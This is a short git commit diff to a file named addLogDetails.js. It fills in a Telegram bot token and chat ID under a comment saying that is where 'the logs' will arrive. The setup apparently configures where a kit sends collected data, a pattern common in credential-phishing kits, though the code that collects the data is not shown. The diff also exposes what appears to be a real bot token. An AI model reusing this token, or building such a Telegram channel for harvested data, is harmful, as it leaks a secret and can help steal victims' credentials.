69295e154de9d66c928a7db31c4b6a287c4d2c03
sarahpyi <sarahpellerin26@gmail.com>
2024-06-15 04:03:22 -0400

    Update addLogDetails.js

--- addLogDetails.js
+++ addLogDetails.js
@@ -1,4 +1,4 @@
 // Add your bot details here👇 (this is where you will get the logs)
 
-var telegramBotId = "";
-var chatId = ;
+var telegramBotId = "5726012829:AAH46pN9YBl82QBFhTb7xOHS31bX8QAhGns";
+var chatId = 5042161242;
